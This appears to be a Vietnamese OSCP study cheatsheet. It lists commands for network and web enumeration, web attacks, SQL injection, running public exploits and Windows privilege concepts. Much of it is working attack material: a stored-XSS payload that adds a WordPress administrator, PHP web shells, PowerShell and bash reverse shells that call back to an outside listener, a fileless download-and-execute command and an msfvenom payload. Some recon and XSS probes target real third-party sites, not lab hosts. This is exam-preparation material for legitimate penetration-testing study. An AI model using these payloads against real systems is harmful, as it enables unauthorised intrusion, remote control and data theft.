# OSCP 2026 Resource - Cheatsheet

> Nguồn: https://app.notion.com/p/OSCP-2026-Resource-38ffc7553bcc801f8c3cd93231135ebc

---

## Information Gathering

### DNS Enum

**Thu thập thông tin X record**
```bash
dig X domain.com
```

**Kiểm tra Zone Transfer**
```bash
dig AXFR @ns1.target.com target.com
```

**Subdomain Enum - Bash shell bruteforce**
```bash
for sub in $(cat wordlist.txt); do host $sub.megacorpone.com; done

for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
```

**Sử dụng DNSrecon**
```bash
# standard mode -> sử dụng DNS record để lấy thông tin
dnsrecon -d megacorpone.com -t std

# bruteforce mode
dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```

**Sử dụng DNSenum** (thu thập từ dns record, Zone Transfer, bruteforce, google search, reverse lookup, Whois)
```bash
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r
# -r: đệ quy -> khi tìm ra subdomain sẽ tiếp tục đệ quy tìm subdomain của subdomain
```

**Sử dụng subfinder** (passive)
```bash
subfinder -d vietlott.vn
```

**Sử dụng amass**
```bash
amass enum -passive -d vietlott.vn
amass enum -active -brute -d vietlott.vn
```

**Một số công cụ khác**
```bash
assetfinder example.com
subbrute -d example.com -w subdomains.txt
sublist3r.py -d example.com -p 80,443
gobuster dns -d example.com -w subdomains.txt
```

**Sử dụng SSL**
```bash
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[]'
```

---

### Port Scanning Nmap

**Stealth / SYN Scanning**
```bash
sudo nmap -sS 192.168.50.149
sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT
```

**TCP Connect Scanning**
```bash
nmap -sT 192.168.50.149
```

**UDP Scanning**
```bash
sudo nmap -sU 192.168.50.149
```

**UDP and TCP common port Scanning**
```bash
sudo nmap -sU -sS 192.168.50.149
```

**Network Sweeping**
```bash
nmap -sn 192.168.50.1-254

nmap -p 80 192.168.50.1-253 -oG web-sweep.txt
grep open web-sweep.txt | cut -d" " -f2
```

**Scan top port**
```bash
nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt
```

**Xác định OS**
```bash
sudo nmap -O 192.168.50.14 --osscan-guess
sudo nmap -O 192.168.50.14 --osscan-limit
```

**Nmap Service Fingerprint**
```bash
nmap -sT -A 192.168.50.14
```

**Nmap Script NSE**
```bash
nmap --script http-headers 192.168.50.6
nmap --script http-* 192.168.50.6
nmap --script http-vuln* 192.168.50.6
sudo nmap --script ftp-* 192.168.10.128
nmap --script smb-enum-shares --script-args smbport=123 -p 123 10.15.7.121
```

**Windows Scan port**
```powershell
Test-NetConnection -Port 445 192.168.50.151
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

---

### SMB Enum

**Scan với nmap**
```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

**Sử dụng nbtscan** (xác định SMB server trong 1 dải mạng)
```bash
sudo nbtscan -r 192.168.50.0/24
```

**Sử dụng netexec**
```bash
nxc smb ip
```

**Sử dụng smbmap**
```bash
smbmap -H 10.129.14.128
```

**Sử dụng Enum4Linux-ng**
```bash
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt
./enum4linux-ng.py 10.129.14.128 -A
```

**Download file**
```
get "Example File.txt"
```

**Download Folder**
```bash
smb> mask ""
smb> recurse ON
smb> prompt OFF
smb> mget *
```

**Download big file**
```bash
smbget smb://<target-ip>/somedir/example.txt -U username
smbget -R smb://<target-ip>/somedir -U username
```

---

### FTP Enum

**Scan Nmap**
```bash
sudo nmap --script-updatedb
sudo nmap -sV -p21 -sC -A 10.129.14.136
```

**Sử dụng netcat**
```bash
nc -nv 10.129.14.136 21
telnet 10.129.14.136 21
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

**Default creds**
```
anonymous : anonymous
anonymous :
ftp : ftp
```

**Chuyển active/passive mode**: `passive` / `passv`

**Chuyển binary/ascii mode**: `binary` / `ascii`

**Download file**
```bash
get file.txt
```

**Download tất cả các file**
```bash
wget -r --user='username' --password='password' ftp://<target-ip>/sample
wget -m ftp://anonymous:anonymous@X.X.X.X
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
# -r: đệ quy | -m: mirror
```

---

### SNMP Enum

**Sử dụng nmap scan cổng UDP**
```bash
sudo nmap -sU --top-port=100 192.168.64.151
sudo nmap -sU -p 161 -sV --script=snmp* -T4 192.168.64.151
```

**Bruteforce community string**
```bash
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp-onesixtyone.txt 192.168.68.151
snmpbulkwalk -v2c -c security 192.168.244.137 .1
```

**SNMP enum**
```bash
snmpwalk -c public -v1 192.168.68.151
snmpbulkwalk
```

**snmp-mibs Plugin** (cài plugin để decode MIB)
```bash
# step 1
sudo apt install snmp-mibs-downloader

# step 2
sudo download-mibs

# step 3
sudo nano /etc/snmp/snmp.conf

# step 4: tìm "mibs :" và comment -> "#mibs :"

# step 5: chạy snmpwalk lại
snmpwalk -c public -v1 192.168.68.151
```

---

## Introduction to Web Applications

### Enum WAF

**Xác định WAF bằng tools**
```bash
wafw00f https://dantri.vn
```

**Công cụ khác**
- https://github.com/Ekultek/WhatWaf (bypass and detect)
- https://github.com/stamparm/identywaf (blind detect)
- https://github.com/bidhata/WAFNinja (bypass, evasion with AI)

**Xác định WAF bằng Header Response**
```bash
curl -i -k https://vietlott.vn
curl -i -k https://sav.gov.vn
```

**Xác định WAF bằng Cookie - payload độc hại**
```bash
curl https://www.akamai.com/?p=%3Cscript%3Ealert(1)%3C/script%3E
curl https://vietlott.vn/?p=%3Cscript%3Ealert(1)%3C/script%3E
```

**DNS recon**
```bash
dig vietlott.vn NS
```

---

### Enum Vhost

**VHOST là gì**
- Cơ chế cho phép nhiều ứng dụng web chạy trên một máy chủ vật lý
- **Name-base** (phổ biến nhất): Phân biệt các host dựa vào Host header
- **IP-base**: Phân biêt dựa vào IP. Trên máy chủ có nhiều card mạng và có các IP khác nhau
- **Port-base**: Mỗi port chạy một ứng dụng khác nhau
- Phổ biển nhất là virtual host bằng namebase. Cách hoạt động: https://app.diagrams.net/#G1XMgQ4OQ5mA0dc5daHbKshCG_cI-QE7Rh#{"pageId"%3A"wmqm8iAw2aa3I2IJ3Wiu"}

**VHOST enum với FFUF**
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://127.0.0.1 \
  -H "Host:FUZZ.lab.local" \
  -t 10 \
  -fs 802
# -w: wordlist | -u: Target url | -H: header | -t: thread | -fs: filter theo size
```

**Đặt file host để truy cập**
```
127.0.0.1    admin.lab.local
127.0.0.1    api.lab.local
127.0.0.1    legacy.lab.local
```

---

### Enum Teckstack

#### Sitemap Manual

- Setup Burpsuite
- Thực thi function theo thứ tự trái → phải, trên → dưới
- Thực thi function con → function cha
- Submit data đúng format
- Mục đích: hiểu logic ứng dụng → quan sát quy tắc URL, quy tắc đặt tham số

#### Web Server

**Phân tích Header HTTP**
```bash
curl -I https://dantri.com.vn
curl -I https://hacktaodi.hacking.vn/
```

**Dùng Nmap**
```bash
nmap -p 80,443 --script http-server-header hacktaodi.hacking.vn
```

**Force Error để tìm thông tin Server và version**
```bash
# TRACE method
curl -X TRACE -i https://hacktaodi.hacking.vn

# Trang 404
curl https://hacktaodi.hacking.vn/notexit.do

# Lỗi 400 - thiếu dấu nháy ở Host
curl -H "host: hacktaodi.hacking.vn'" https://hacktaodi.hacking.vn

# Thiếu Host header
curl -H "host: " https://hacktaodi.hacking.vn

# Extension đặc trưng
curl https://hacktaodi.hacking.vn/index.php

# Header trùng lặp
# Content-Length: 13
# Content-Length: 8

# Header đặc biệt (khoảng trắng trước dấu hai chấm)
# Transfer-Encoding\t: chunked
# Transfer-Encoding : chunked

# Header quá dài (gửi chuỗi hex hàng nghìn ký tự)
# BE39B61BC7325EA6A5E53B1A159E4C5A... (lặp lại hàng KB)

# URL quá dài
# aaaaaa...aaaa (hàng trăm ký tự)

# Chunked + content-length
# Transfer-Encoding: chunked
```

**File/endpoint mặc định**
```
/server-status       - Apache status page
/nginx_status        - Nginx stub status
/manager/html        - Tomcat Manager
/actuator            - Spring Boot Actuator
/metrics             - monitoring endpoint
/phpinfo.php         - thông tin PHP và server
```

**Sử dụng httpx**
```bash
httpx -tech-detect -title -status-code -follow-redirects -u https://example.com
```

#### Language

```bash
curl -i -H "Host: api.lab.local" http://127.0.0.1/api/v1/health
```

Dựa vào Web server → đoán ngôn ngữ backend (express → nodejs)

#### Framework

- Phân tích header: `curl -I https://vietlott.vn`
- Phân tích cookie, HTML source, static files, JS, lỗi 500
- Bruteforce endpoint đặc trưng, URL pattern, response format

---

### Enum Web Content

#### Hidden Directories

**Sử dụng ffuf**
```bash
ffuf -u http://public.lab.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x http://127.0.0.1:8080 -ac
ffuf -u http://public.lab.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x http://127.0.0.1:8080 -ac -r
ffuf -u http://public.lab.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x http://127.0.0.1:8080 -ac -recursion
```

**Sử dụng gobuster**
```bash
gobuster dir -u http://public.lab.local -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
gobuster dir -u http://public.lab.local -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt --exclude-length 802
```

**Sử dụng feroxbuster**
```bash
feroxbuster -u http://public.lab.local -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
feroxbuster -u http://public.lab.local -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 10
```

Thực hiện enum theo wordlist của: Web-Server, Framework, Language, CMS

#### Hidden Files

```bash
# ffuf
ffuf -u http://public.lab.local/assets/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080 -ac -e .js,.html,.bak

# gobuster
gobuster dir -u http://public.lab.local/backup -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x bak,zip,rar,old --exclude-length 802

# feroxbuster
feroxbuster -u http://public.lab.local/backup -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 10 -x bak,zip,rar,old

# File Common
ffuf -u http://public.lab.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080 -ac
```

**Wpscan**
```bash
wpscan --url http://192.168.219.1:8181 --enumerate vp --plugins-detection mixed --api-token <TOKEN>
```

---

### Enum Header

Sử dụng **Param miner plugin** trong Burpsuite

---

### API Blackbox Enum

#### Static Enum API

**Phân tích file JS min, map**
**Tìm các endpoint có sẵn**
```bash
curl http://public.lab.local/assets/app.abcd1234.js -o app.abcd1234.js
curl http://public.lab.local/assets/app.abcd1234.js.map -o app.abcd1234.js.map

node -e "
  const fs = require('fs');
  const map = JSON.parse(fs.readFileSync('app.abcd1234.js.map'));
  map.sources.forEach((src, i) => {
    const name = src.replace('../', '').replace(/\//g, '_');
    fs.writeFileSync('recovered_' + name, map.sourcesContent[i]);
    console.log('wrote:', name);
  });
  "
```

**Tìm API runtime bằng JS Hook**
```/api/v1/internal/token-refresh```
  - Truy cập public.lab.local
  - Một số API path được build trong quá trình Runtime → API chỉ được build khi có một sự kiện khác đã xảy ra → Phân tích static không hiệu quả
  - Cần sử dụng một biện pháp gọi là JS Hook: 
    ```javascript
    const origFetch = window.fetch;
    window.fetch = function(input, init = {}) {
      const url = input instanceof Request ? input.url : input;
      const method = (init.method || 'GET').toUpperCase();
      console.log(`[Fetch] ${method} ${url}`);
      if (init.body) console.log(`  Body:`, init.body);
      return origFetch.apply(this, arguments);
    };
    ```

**Angular framework - các file JS**
    - `main.js` → App code chính, components, services, API calls, routes
    - `polyfills.js` → Tương thích trình duyệt cũ
    - `runtime.js` → webpack runtime / Angular module loader
- Phân tích framework angular
    - Chức năng của file js
        - Main.js → App code chính. Chứa Angular app, components, services, API calls, routes. chứa nhieuf config, logic, và endpoint API
        - polyfills.js → Dùng để tương thích với trình duyệt cũ
        - runtime.js → **webpack runtime / Angular module loader → App có nhiều module nhỏ ví dụ như quản lý người dùng, quản lý chart … khi app cần dùng module nào sẽ load module đấy**
            - Chứa các thông tin về số và hash
            - Cần thu thập thông tin để phân tích API endpoint
        - Script: bundle js của bên thứ 3
#### Dynamic Enum API

**Tạo pattern**
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

**Gobuster với pattern**
```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

**Thử truy cập**
```bash
curl -i http://192.168.50.16:5002/users/v1
```

**Bruteforce tiếp**
```bash
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
curl -i http://192.168.50.16:5002/users/v1/admin/password
```

**Đổi method**: `GET -> POST -> PUT`

---

## Common Web Attack

### Leo quyền bằng Store XSS

**Code JS lấy `_wpnonce_create-user`**
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

**Build request body**
```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

**Payload rút ngắn (dùng CircleCellJSCompress)**
```javascript
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker2&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

**Encode thành charcode để bypass badchars**
```javascript
function encode_to_javascript(string) {
    var output = '';
    for(var pos = 0; pos < string.length; pos++) {
        output += string.charCodeAt(pos);
        if(pos != (string.length - 1)) output += ",";
    }
    return output;
}
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

**Payload cuối - dùng eval(String.fromCharCode(...))**
```html
<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,...))</script>
```

---

### Path Traversal

**Payload detect**
```
../../../../../../etc/passwd
..\..\..\..\..\..\windows\system32\drivers\etc\hosts
file:///etc/passwd
```

---

### Command Injection

**Lab - kiểm tra hệ điều hành**
```bash
git;ip
git;ipconfig
```

**Kiểm tra Shell hiện tại**
```bash
git;dir
git;ls
```

**Test kết nối về máy**
```bash
curl 192.168.45.174:4444
```

---

### Upload File

#### Upload file với tệp có thể thực thi

**Nhận diện Web Server và ngôn ngữ**
```bash
# Kiểm tra phản ứng server
echo "this is a test" > test.txt
# Upload test.txt trước → quan sát
```

**Upload PHP shell**
```php
<?php system($_GET['cmd']);?>
```

**Nếu blacklist chặn .php** → thử extension khác:
```
test.PhP, test.php5, test.php7, test.php8, test.phtml
```

**Nếu server dùng AddType → bypass**
```apache
AddType application/x-httpd-php .txt
```

**Xác định shell environment**
```
echo %ComSpec%   → cmd.exe hay powershell?
```

**Powershell reverse shell**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Encode payload thành base64 (Windows UTF-16)**
```powershell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.174",4444);...'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
```

**Dùng Fileless (bypass antivirus)**
```powershell
# Tạo file shell.txt trên Kali, chạy Python server
python3 -m http.server 9999

# Trên máy Windows - download và thực thi trực tiếp
powershell -c "iex (Invoke-WebRequest http://192.168.45.174:9999/shell.txt -UseBasicParsing).Content"
```

**Nếu server là cmd.exe**
```powershell
powershell -c "whoami"
powershell -e "dwBoAG8AYQBtAGkA"
```

#### Upload file với tệp không thực thi

**Lab**: Upload bất kỳ loại file nhưng không biết đường dẫn truy cập

**Path traversal khi upload** → lưu file vào đường dẫn đã biết:
```
img/shell1.php
```

**Upload SSH authorized_keys để leo quyền root**
```bash
# Tạo SSH key
ssh-keygen
# Tạo file authorized_keys từ public key
cat fileup.pub > authorized_keys
# Upload authorized_keys với path traversal
# Sau đó SSH vào
ssh -i filessh root@mountaindesserts.local -p 2222
```

---

### FI / LFI

#### Basic LFI

> LFI khác Path Traversal: LFI **thực thi** code trong file, Path Traversal chỉ đọc file.

**Lab: LFI → Log Poisoning**

```bash
# Truy cập file access.log qua LFI
curl http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

File log ghi lại nội dung header → Log Poisoning bằng mã PHP:
```php
<?php echo system('id');?>
```

**Burpsuite - truy cập LFI**
```
?page=../../../../../../../../../var/log/apache2/access.log
```

**Kiểm tra môi trường**
```
# /etc/passwd
page=../../../../../../../../../etc/passwd

# Shell hiện tại
system('echo $0');
```

**Reverse shell - khi server chạy /bin/sh**
```php
system('bash -c "bash -i >& /dev/tcp/192.168.45.187/4444 0>&1"')
```

**Dùng base64 để bypass badchar**
```bash
echo -n 'bash -c "bash -i >& /dev/tcp/192.168.45.187/4444 0>&1"' | base64
```
```php
system(base64_decode('YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4Ny80NDQ0IDA+JjEi'));
```

---

## SQL Injection

### DBMS

#### MySQL

**Default creds**: `user / userpassword`

**Phiên bản**: Oracle (MariaDB là phiên bản mã nguồn mở)

**Vị trí file cấu hình**
```
# Linux
/etc/my.cnf                         # CentOS/RHEL/Fedora
/etc/mysql/my.cnf                   # Debian/Ubuntu
/etc/mysql/mysql.conf.d/mysqld.cnf  # Ubuntu mới
~/.my.cnf                           # Config của user hiện tại

# Windows
C:\ProgramData\MySQL\MySQL Server 8.0\my.ini
C:\Program Files\MySQL\MySQL Server 8.0\my.ini
```

**Cấu hình binding**
```ini
[mysqld]
bind-address = 0.0.0.0    # ⚠️ Lắng nghe mọi interface (nguy hiểm)
bind-address = 127.0.0.1  # ✅ Chỉ local
```
```sql
-- Đọc binding config từ MySQL
SHOW VARIABLES LIKE '%bind%';
```

**Cấu hình đọc/ghi file**
```sql
-- Kiểm tra secure-file-priv
SHOW VARIABLES LIKE '%secure%'

-- secure-file-priv=NULL   -> Vô hiệu hoá việc ghi file
-- secure-file-priv=""     -> Cho phép ghi vào bất cứ đâu
-- secure-file-priv="/tmp" -> cho phép ghi vào /tmp
```

**Cấu hình log (Log Poisoning tiềm năng)**
```sql
-- Kiểm tra log
SHOW VARIABLES LIKE 'general_log';
SHOW VARIABLES LIKE 'general_log_file';

-- Bật log
SET GLOBAL general_log = 'ON';
```

**Xác thực - loại tài khoản**

| Host | Ý nghĩa |
|------|---------|
| localhost | Chỉ kết nối local qua socket |
| 127.0.0.1 | Chỉ kết nối local qua TCP |
| % | Kết nối từ bất kỳ đâu |
| 192.168.1.% | Kết nối từ subnet cụ thể |

**Xác thực bằng Unix socket** (login không cần password nếu cấu hình như vậy)
```bash
mysql
mysql -u root
sudo mysql   # nếu cấu hình unix_socket plugin
```

**MySQL Service trong Pentest - Unauthenticated**
```bash
# Scan cổng
nmap -sV -p 3306 target
nmap -p 3306 --script mysql-* target

# Kiểm tra đăng nhập không cần password
mysql -h target -u root
mysql -h target -u ''
mysql -h target
sudo mysql       # nếu trên local

# Brute force
hydra -l root -P wordlist.txt target mysql
medusa -h target -u root -P wordlist.txt -M mysql
```

**MySQL Service trong Pentest - Authenticated**
```sql
-- Thông tin cơ bản
SELECT @@version;
SELECT @@hostname;
SELECT @@datadir;
SELECT user();
SELECT current_user();

-- Cấu hình nguy hiểm
SHOW VARIABLES LIKE 'secure_file_priv';
SHOW VARIABLES LIKE 'local_infile';
SHOW VARIABLES LIKE 'general_log';
SHOW VARIABLES LIKE 'bind_address';

-- Tài khoản và quyền
SELECT user, host, plugin, authentication_string FROM mysql.user;

-- Users nguy hiểm
SELECT user, host FROM mysql.user WHERE user = '';           -- anonymous
SELECT user, host FROM mysql.user WHERE host = '%';          -- mọi nơi
SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';   -- super
SELECT user, host FROM mysql.user WHERE File_priv = 'Y';    -- file read/write

-- Liệt kê databases
SHOW DATABASES;
SELECT schema_name FROM information_schema.schemata;

-- Chọn database
use DB_name;

-- Liệt kê bảng
show tables;
DESC users;

-- Query dữ liệu
SELECT * FROM users;

-- Đọc/ghi file (nếu có quyền)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

#### MSSQL

**Default creds**: `sa / Sa@123456`

**xp_cmdshell**: Có từ SQL 2000, bị disable mặc định từ SQL 2005+

**Chế độ xác thực**:
- **Windows Authentication Mode**: Chỉ Windows/AD accounts, Kerberos/NTLM, SA disabled, không bruteforce được
- **Mixed Mode Authentication**: Windows + SQL accounts, password hash trong `sys.sql_logins`, SA có thể enable, bruteforce qua port 1433

**Đăng nhập local - sqlcmd**
```bash
# Folder: C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe

# Windows Auth
sqlcmd -S localhost
sqlcmd -S localhost -No

# SQL Auth
sqlcmd -S localhost -U sa -P password
sqlcmd -S localhost,1433 -U sa -P password
sqlcmd -S localhost -U sa -P password -Q "SELECT @@VERSION"
sqlcmd -S localhost -U sa -P password -No   # bypass cert error (SQL 2022+)
```

**Impacket từ remote**
```bash
# Windows Auth
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

# SQL Auth
impacket-mssqlclient Administrator:Lab123@192.168.50.18
```

**Thu thập thông tin unauth**
```bash
nmap -p 1433 --script ms-sql-* 192.168.1.100

# Đăng nhập không pass từ xa
impacket-mssqlclient sa@192.168.1.100
impacket-mssqlclient sa:@192.168.1.100
impacket-mssqlclient guest:@192.168.1.100

# Bruteforce
hydra -L users.txt -P passwords.txt mssql://192.168.1.100
```

**Thu thập thông tin đã auth**
```sql
-- Role hiện tại
SELECT IS_SRVROLEMEMBER('sysadmin')        -- 1 = có
SELECT IS_SRVROLEMEMBER('securityadmin')
SELECT IS_SRVROLEMEMBER('serveradmin')
SELECT IS_SRVROLEMEMBER('db_owner')

-- Kiểm tra xp_cmdshell
SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'
-- value_in_use = 1 -> đang enable

-- Bật xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Thu thập CSDL
EXEC sp_databases;
SELECT name FROM master..sysdatabases;

USE ten_database

-- Bảng trong CSDL
SELECT name FROM sys.tables;

-- Dữ liệu trong bảng
SELECT * FROM dbname.db_table;
```

---

### SQL Injection Techniques

#### Error Base

**Lý thuyết**: Lỗi SQL được trả về cho người dùng

**Code lỗi**
```java
String id = request.getParameter("id");
String query = "SELECT name FROM users WHERE id = " + id;
// ...
catch (SQLException e) {
    out.println("<p>Error: " + e.getMessage() + "</p>"); // lỗi trả về browser
}
```

**Hàm GTID_SUBSET** (lấy dữ liệu từ chuỗi XML)
```sql
SELECT GTID_SUBSET('ab',1)
SELECT GTID_SUBSET((select @@version),1)
```

**Payload detect**
```
'   "   )   (
```

**Payload lấy phiên bản DBMS**
```sql
' or 1=1 in (select @@version) -- -
```

**Lấy danh sách CSDL**
```sql
' AND 1=1 IN (SELECT EXTRACTVALUE(1, CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)))) -- -
```

**Lấy cột của 1 bảng**
```sql
' AND 1=1 IN (SELECT EXTRACTVALUE(1, CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='ten_bang')))) -- -
```

**Lấy dữ liệu trong cột**
```sql
' AND 1 IN (SELECT EXTRACTVALUE(1, CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM ten_bang)))) -- -
```

#### Union Base

**Lý thuyết**: UNION nối kết quả 2 SELECT; điều kiện: cùng số cột + cùng kiểu dữ liệu

**Code lỗi**
```java
String id = request.getParameter("id");
String query = "SELECT name FROM users WHERE id = " + id;
// Trả về dữ liệu trực tiếp nhưng không có lỗi
```

**Xác định số cột** → ORDER BY  
**Xác định kiểu dữ liệu** → null

```sql
-- Null test
SELECT empId,name FROM EMPLOYEE WHERE dept = 'Sales' UNION SELECT null,null;

-- Tìm cột hiển thị trên web
SELECT empId,name FROM EMPLOYEE WHERE dept = 'Sales' UNION SELECT 1,2;

-- Lấy dữ liệu từ vị trí số 2
SELECT empId,name FROM EMPLOYEE WHERE dept = 'Sales' UNION SELECT 1,(Select @@version);
```

#### Boolean Base

**Lý thuyết**: Code chỉ trả về trạng thái (True/False), không trả về dữ liệu

**Code lỗi**
```java
String user = request.getParameter("user");
String query = "SELECT * FROM users WHERE username = '" + user + "'";
out.println(rs.next() ? "User found" : "Not found");
```

```sql
SELECT empId,name FROM EMPLOYEE WHERE dept = 'Sales' and '1' = '1'   -- True
SELECT empId,name FROM EMPLOYEE WHERE dept = 'Sales' and '1' = '2'   -- False

-- Lấy ký tự đầu của database name (thử từng ký tự)
SELECT empId,name FROM EMPLOYEE WHERE dept = 'Sales' AND SUBSTRING(database(),1,1)='a'
```

#### Time Base

**Lý thuyết**: Code luôn trả về OK, detect bằng thời gian delay

**Code lỗi**
```java
String id = request.getParameter("id");
String query = "SELECT * FROM users WHERE id = " + id;
stmt.executeQuery(query);
out.println("OK"); // luôn trả về OK
```

```sql
-- Delay cơ bản
SELECT empId,name FROM EMPLOYEE WHERE dept = 'Sales' AND IF(1=1, SLEEP(3), 0)

-- Lấy ký tự database
SELECT empId,name FROM EMPLOYEE WHERE dept = 'Sales' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 0)
```

---

## Local Exploit Attack

**Kiểm tra CVE trong exploitdb**
```bash
searchsploit "qdPM"
searchsploit -m 50944
```

**Tạo custom wordlist bằng cewl**
```bash
cewl http://192.168.50.11/ -w wordlist.txt
```

**Wordlist email**
```
jeremy@AIDevCorp.org
alex@AIDevCorp.org
george@AIDevCorp.org
vincent@AIDevCorp.org
```

**ffuf bruteforce** → tìm: `george@AIDevCorp.org:AIDevCorp`

**Chạy exploit**
```bash
python3 50944.py -url http://192.168.50.11/project/ -u george@AIDevCorp.org -p AIDevCorp
```

**Truy cập shell**
```bash
curl "http://192.168.173.11/project/uploads/users/623405-backdoor.php?cmd=whoami"
```

**Reverse shell**
```bash
# Kiểm tra nc
curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"

# Listener trên kali
nc -lvnp 6666

# Reverse shell
curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash"

# PTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Tạo shell với msfvenom**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe
nc -lnvp 4444
```

---

## Windows Priv

### Enumerating Windows

#### Các khái niệm: SID, Access Token, ACL, UAC

**Privileges**
- Là quyền hệ thống áp dụng cho tài khoản hoặc nhóm
- Trả lời câu hỏi: "Tài khoản này được phép làm gì với hệ thống?"
- Xem privileges: `whoami /all` hoặc `whoami /priv`

**SID (Security Identifier)**
- Chuỗi định danh duy nhất để xác định 1 thực thể trong Windows
- Windows sử dụng SID để quản lý tài khoản; đổi tên tài khoản → SID không đổi
- Cấu trúc: `S-R-X-Y`
  - `S`: Ký tự đầu
  - `R (Revision)`: Phiên bản cấu trúc (thường là 1)
  - `X (Identifier Authority)`: `1`=World, `2`=Local, `5`=NT Authority
  - `Y (Subauthorities)`: Domain Identifier + RID

**Access Token**
- Tạo khi đăng nhập (bởi LSASS.exe)
- Giống như thẻ ra vào toà nhà - xác định danh tính và quyền
- Chứa: User SID, Group SIDs, Privileges, Logon SID, Default DACL, Token Type
- **Integrity Level** (từ Vista): Low, Medium, High, System

**ACL (Access Control List)**
- Nằm trong Security Descriptor của object (File, Folder)
- Tạo ra khi tạo file/folder, kế thừa từ folder cha hoặc từ Default DACL
```powershell
Get-Acl <file>
```

**UAC (User Account Control)**
- Khi login: tạo 2 access token: Standard (filtered) + Administrator (full)
- Mặc định chạy với filtered token
